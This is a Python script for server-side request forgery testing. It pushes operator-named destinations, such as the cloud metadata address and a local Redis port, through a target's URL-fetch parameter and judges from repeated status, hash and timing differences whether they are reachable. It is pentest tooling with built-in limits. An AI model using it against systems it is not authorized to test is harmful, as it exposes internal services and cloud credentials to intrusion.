#!/usr/bin/env python3
"""Push one explicit destination at a time through a parameter that the target fetches, and judge the repeated
in-band oracle.

The target does the fetching; this script only fills the placeholder and records what came back for each destination
you name. It sends one request per destination, in the order given, with no concurrency and no destination discovery.
With `--runs N` it repeats the baseline/candidate pairs interleaved and prints a machine-readable verdict per
candidate:

  oracle: separated    the response class repeats a difference, or the timing ranges stay disjoint by --min-delta-ms
  oracle: inconclusive a single sample, or a difference the timing ranges cannot separate

Destinations are printed without their query or userinfo; request URLs and cookie/header values are not printed.
Quote the receipts, not the request.

Usage:
  ssrf_probe.py --target 'http://127.0.0.1:8080/fetch?url={{url}}' \
                --baseline http://127.0.0.1:8080/health \
                --candidate http://169.254.169.254/latest/meta-data/ \
                --candidate http://127.0.0.1:6379/
"""
import argparse
import hashlib
import statistics
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import quote, urlsplit

PLACEHOLDER = "{{url}}"
MAX_RUNS = 20


def safe_destination(value: str) -> str:
    """A label without query, fragment or userinfo; never the request the target would make."""
    text = value.split("#", 1)[0].split("?", 1)[0]
    if "://" in text:
        scheme, rest = text.split("://", 1)
        rest = rest.rsplit("@", 1)[-1]
        return f"{scheme}://{rest}"[:300]
    return "<unparsable-destination>"


def probe(url: str, timeout: float) -> tuple[tuple[str, int, str], str, float]:
    """One request: a comparable signature, the printed shape, and the elapsed milliseconds."""
    parts = urlsplit(url)
    if parts.scheme not in ("http", "https") or not parts.netloc:
        sys.exit("refused: --target must be an absolute http(s) URL you were authorized to test")
    started = time.monotonic()
    try:
        with urllib.request.urlopen(urllib.request.Request(url, method="GET"), timeout=timeout) as response:
            body, status = response.read(), response.status
    except urllib.error.HTTPError as error:
        body, status = error.read(), error.code
    except urllib.error.URLError as error:
        elapsed = (time.monotonic() - started) * 1000
        return (("no-response", 0, str(error.reason)), f"no-response reason={error.reason}", elapsed)
    elapsed = (time.monotonic() - started) * 1000
    sha = hashlib.sha256(body).hexdigest()[:16]
    return ((str(status), len(body), sha), f"status={status} bytes={len(body)} sha256_16={sha} elapsed_ms={elapsed:.0f}", elapsed)


def median(values: list[float]) -> float:
    return statistics.median(values) if values else 0.0


def judge(baseline: list[tuple[tuple[str, int, str], str, float]], candidate: list[tuple[tuple[str, int, str], str, float]],
          runs: int, min_delta_ms: float) -> tuple[str, str]:
    """The repeated-oracle rule: a verdict only when the difference repeats or the timing ranges do not overlap."""
    categorical = sum(1 for left, right in zip(baseline, candidate) if left[0] != right[0])
    if categorical >= max(1, (runs + 1) // 2):
        return ("separated", f"status, length or body hash differs in {categorical}/{runs} paired run(s)")
    if runs < 2:
        return ("inconclusive", "a single destination pair is not a repeated oracle; one timing sample is not proof")
    base = [sample[2] for sample in baseline if sample[0][0] != "no-response"]
    cand = [sample[2] for sample in candidate if sample[0][0] != "no-response"]
    if not base or not cand:
        return ("inconclusive", "a paired run produced no response, so the timing ranges cannot be compared")
    if min(cand) > max(base) + min_delta_ms:
        return ("separated", f"candidate slower: min candidate {min(cand):.0f} ms vs max baseline {max(base):.0f} ms (+{min_delta_ms:.0f} ms margin)")
    if min(base) > max(cand) + min_delta_ms:
        return ("separated", f"candidate faster: min baseline {min(base):.0f} ms vs max candidate {max(cand):.0f} ms (+{min_delta_ms:.0f} ms margin)")
    return ("inconclusive", "timing ranges overlap or the requested margin was not reached")


def main() -> None:
    parser = argparse.ArgumentParser(description="Send one explicit destination at a time through a fetch parameter, repeated.")
    parser.add_argument("--target", required=True, help=f"authorized URL containing {PLACEHOLDER} where the destination goes")
    parser.add_argument("--baseline", required=True, help="a destination that is certainly reachable, for comparison")
    parser.add_argument("--candidate", action="append", required=True, help="repeatable; one destination per request")
    parser.add_argument("--runs", type=int, default=1, help=f"paired baseline/candidate repetitions, 1..{MAX_RUNS}; default 1")
    parser.add_argument("--min-delta-ms", type=float, default=150.0, help="timing margin a separated oracle must keep; default 150 ms")
    parser.add_argument("--timeout", type=float, default=30.0)
    args = parser.parse_args()

    if args.target.count(PLACEHOLDER) != 1:
        sys.exit(f"refused: --target must contain {PLACEHOLDER} exactly once")
    if not 1 <= args.runs <= MAX_RUNS:
        sys.exit(f"refused: --runs must be 1..{MAX_RUNS}")
    if args.min_delta_ms <= 0:
        sys.exit("refused: --min-delta-ms must be positive")

    destinations = [("baseline", args.baseline)] + [("candidate", value) for value in args.candidate]
    print(f"baseline: destination={safe_destination(args.baseline)}")
    for value in args.candidate:
        print(f"candidate: destination={safe_destination(value)}")

    samples: list[list[tuple[tuple[str, int, str], str, float]]] = [[] for _ in destinations]
    for run in range(1, args.runs + 1):
        for index, (label, destination) in enumerate(destinations):
            url = args.target.replace(PLACEHOLDER, quote(destination, safe=""))
            result = probe(url, args.timeout)
            samples[index].append(result)
            prefix = f"run{run} " if args.runs > 1 else ""
            print(f"{prefix}{label}: {result[1]}")

    baseline_samples = samples[0]
    for index, value in enumerate(args.candidate, start=1):
        candidate_samples = samples[index]
        base_times = [sample[2] for sample in baseline_samples if sample[0][0] != "no-response"]
        cand_times = [sample[2] for sample in candidate_samples if sample[0][0] != "no-response"]
        base_median, cand_median = median(base_times), median(cand_times)
        verdict, reason = judge(baseline_samples, candidate_samples, args.runs, args.min_delta_ms)
        print(f"candidate {index}: timing_ms baseline_median={base_median:.1f} candidate_median={cand_median:.1f} "
              f"baseline_max={(max(base_times) if base_times else 0.0):.1f} candidate_min={(min(cand_times) if cand_times else 0.0):.1f}")
        print(f"candidate {index}: oracle_reason={reason}")
        print(f"oracle: {verdict}")


if __name__ == "__main__":
    main()
